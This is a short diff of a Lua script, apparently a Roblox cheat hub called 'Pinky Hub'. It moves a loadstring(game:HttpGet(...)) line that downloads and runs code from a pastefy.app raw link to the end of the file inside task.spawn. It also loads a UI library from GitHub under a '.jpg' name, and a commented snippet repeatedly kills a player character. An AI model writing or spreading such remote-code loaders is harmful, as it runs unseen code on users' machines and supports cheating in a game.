@@ -1,6 +1,3 @@
-spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/3aNMAC9N/raw",true))();
-end)
 local ilovepinky = loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uwuware/main/lib/kavomobile.jpg",true))();
 local w = ilovepinky.CreateLib("Pinky Hub😘 daddy loves u", "PinkyTheme");
 local skripts = w:NewTab("skripts")
@@ -241,3 +238,6 @@ while wait(4) do
 plr.Character.Humanoid.Health = 0
 end;
 ]]--
+task.spawn(function()
+loadstring(game:HttpGet("https://pastefy.app/3aNMAC9N/raw",true))();
+end)
